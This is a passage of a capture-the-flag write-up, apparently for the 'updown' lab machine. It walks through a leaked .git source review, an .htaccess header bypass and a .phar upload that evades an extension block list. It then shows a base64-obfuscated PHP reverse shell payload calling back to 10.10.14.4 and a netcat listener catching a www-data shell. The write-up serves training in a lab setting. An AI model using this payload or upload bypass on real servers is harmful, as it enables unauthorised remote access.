## Command execution through subdomain
Download the .git folder that was found during enumeration and use an application that can view past commits to see some source code...
```php
#.htaccess
SetEnvIfNoCase Special-Dev "only4dev" Required-Header
Order Deny,Allow
Deny from All
Allow from env=Required-Header
```
Set a custom header like ```.htaccess``` says to and try browsing to the ```dev.siteisup.htb```
![[Pasted image 20221022215643.png]]
A web page that is similar to the one that was seen before, but not identical.
What's more, the ```.git``` directory that was leaked exposed source code for this site...
Checking out the source code (specifically checker.php) shows that the application will take a user  provided file and write it to disk before doing some processing on it and deleting it...
This is a classing php command execution angle, but the source code does have some checks in place.
```php
$file = $_FILES['file']['name'];
	
	# Check if extension is allowed.
	$ext = getExtension($file);
	if(preg_match("/php|php[0-9]|html|py|pl|phtml|zip|rar|gz|gzip|tar/i",$ext)){
		die("Extension not allowed!");
	}
```
Thankfully there are no checks on the contents of the file and the devs chose to use a block list instead of an allow list. The block list would work, but it doesn't cover every extension that the server will execute. Namely, .phar files.
![[Pasted image 20221022220300.png]]
Another problem with the app is that it deletes uploaded files after the app has checked whether the sites in the file are up or not. Since this exploit depends on being able to navigate to the file and execute it before the server deletes it, that could be a problem. Luckily there is an easy fix. After the php code that is to be executed, add a URL pointing back to the attacker box. Then, start a net cat listener on port 80. Net cat will keep the connection alive which will allow for enough time to manually navigate to the file that was wrote to disk and execute it. Send the request and navigate to the uploaded file in ```/uploads```.
![[Pasted image 20221022220621.png]]
Normally this would be easy RCE, but the devs made it a touch more difficult by disallowing the most common system functions.
![[Pasted image 20221022220745.png]]
Yuck. Luckily, like the block list on file extensions, the developers didn't disable *all* of the functions that can be used to achieve OS commands.
My reverse shell payload: 
```php
# The base64 glob decodes to "bash  -i >& /dev/tcp/10.10.14.4/9001  0>&1"
<?php echo proc_close(proc_open("echo -n YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNC85MDAxICAwPiYx | base64 -d | bash",array(),$something)); ?>
```
Set up a listener on the attacker box and follow the same steps from before to catch a shell as a low-priv user.
```bash
$ nc -lvnp 9001     
listening on [any] 9001 ...
connect to [10.10.14.4] from (UNKNOWN) [10.10.11.177] 56654
bash: cannot set terminal process group (911): Inappropriate ioctl for device
bash: no job control in this shell
www-data@updown:/var/www/dev/uploads/7696b028f71b324d4c2125c61b531af8$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```